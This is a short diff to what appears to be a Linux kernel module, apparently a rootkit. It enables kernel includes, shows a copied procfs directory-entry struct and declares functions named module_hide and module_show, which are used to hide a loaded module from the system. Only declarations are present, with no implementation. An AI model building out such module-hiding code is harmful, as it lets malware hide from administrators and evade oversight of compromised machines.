@@ -2,9 +2,9 @@
 #include <linux/proc_fs.h>
 #include <asm/uaccess.h>
 /* WTF, it compiles without these */
-//#include <linux/kernel.h>
+#include <linux/kernel.h>
 //#include <linux/init.h>
-//#include <linux/kobject.h>
+#include <linux/kobject.h>
 //#include <linux/fs.h>
 //#include <linux/string.h>
 //#include <linux/proc_ns.h>
@@ -46,3 +46,7 @@ struct proc_dir_entry {
 		u8 namelen;
 		char name[];
 };
+
+static int procfs_init(void);
+void module_hide(void);
+void module_show(void);
